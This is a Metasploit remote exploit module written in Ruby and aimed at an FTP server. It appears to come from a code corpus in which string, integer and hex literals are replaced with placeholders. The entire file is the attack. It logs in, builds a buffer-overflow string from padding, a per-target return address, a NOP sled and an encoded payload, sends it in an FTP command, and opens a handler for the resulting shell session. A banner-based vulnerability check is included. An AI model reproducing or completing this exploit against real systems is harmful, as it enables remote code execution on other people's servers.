require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = AverageRanking include Msf :: Exploit :: Remote :: Ftp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > true , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , <str> = > { <str> = > <str> , } } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , ] , <str> = > <str> , <str> = > <int> ) ) end def check connect disconnect if ( banner =~ <str> ) return Exploit :: CheckCode :: Appears end return Exploit :: CheckCode :: Safe end def exploit c = connect_login return if not c sploit = <str> * <int> + rand_text_english ( <int> , payload_badchars ) sploit << [ target . ret ] . pack ( <str> ) + make_nops ( <int> ) + payload . encoded print_status ( <str> target . name <str> ) send_cmd ( [ <str> , sploit ] , false ) handler disconnect end end 
